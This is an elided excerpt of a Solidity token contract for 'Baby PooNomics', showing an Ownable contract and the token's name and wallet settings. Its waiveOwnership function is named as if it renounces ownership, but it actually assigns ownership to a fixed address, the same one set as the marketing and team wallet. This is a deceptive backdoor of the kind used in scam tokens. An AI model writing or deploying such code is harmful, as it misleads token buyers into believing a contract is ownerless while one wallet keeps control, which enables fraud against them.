...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0x5f05269fBABD1f069344C31f64Ffdf12A868E895));
        _owner = address(0x5f05269fBABD1f069344C31f64Ffdf12A868E895);
    }
...
contract BabyPooNomics is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Baby PooNomics";
    string private _symbol = "BabyPooNomics";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x5f05269fBABD1f069344C31f64Ffdf12A868E895);
    address payable public teamWalletAddress = payable(0x5f05269fBABD1f069344C31f64Ffdf12A868E895);
